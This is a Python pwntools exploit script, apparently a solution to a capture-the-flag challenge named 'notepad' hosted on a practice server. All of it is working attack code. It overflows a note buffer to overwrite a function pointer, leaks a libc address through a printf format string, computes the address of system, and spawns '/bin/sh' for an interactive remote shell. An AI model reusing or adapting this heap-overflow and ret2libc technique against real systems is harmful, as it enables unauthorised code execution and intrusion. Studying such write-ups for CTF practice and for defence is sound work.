from pwn import *
context.log_level = 'debug'
#p = process('./notepad',env = {"LD_PRELOAD":"../libc-2.23.so.i386"})
p = remote('hackme.inndy.tw',7713)
elf = ELF('./notepad')

def new(size,data):
	p.sendlineafter('::> ','a')
	p.sendlineafter('size > ',str(size))
	p.sendlineafter('data > ',data)


def open(id,choice,edit = 'n',data = ''):
	p.sendlineafter('::> ','b')
	p.sendlineafter('id > ',str(id))
	p.sendlineafter('edit (Y/n)',edit)
	if edit == 'y':
		p.sendlineafter('content > ',data)
	p.sendlineafter('::> ',choice)


def delete(id):
	p.sendlineafter('::> ','c')
	p.sendlineafter('id > ',str(id))


p.recvuntil('::> ')
p.sendline('c')


new(60,'aaaa') #0
new(60,'bbbb') #1
new(60,'cccc') #2

#free note[1]
payload = 'a'*52 + p32(elf.plt['free'])
open(0,'a','y',payload)
open(1,'^','n')

#free note[0]
delete(0)

#leak libc
payload = 'a'*52 + p32(elf.plt['printf']) + 'aaaa'
payload += p32(0x51) + '%1063$p\x00'
new(136,payload)
open(1,'^','n')
__libc_start_main_ret = int(p.recvuntil('note',drop = True),16)
offset___libc_start_main_ret = 0x18637
offset_system = 0x0003ad80
libc_base = __libc_start_main_ret - offset___libc_start_main_ret
system_addr = libc_base + offset_system
log.success('libc base addr : 0x%x'%libc_base)
log.success('system addr : 0x%x'%system_addr)


#system('/bin/sh\x00')
payload = 'a'*52 + p32(system_addr) + 'aaaa'
payload += 'bbbb' + '/bin/sh\x00'
delete(0)
new(136,payload)
#gdb.attach(p)
open(1,'^','n')


p.interactive()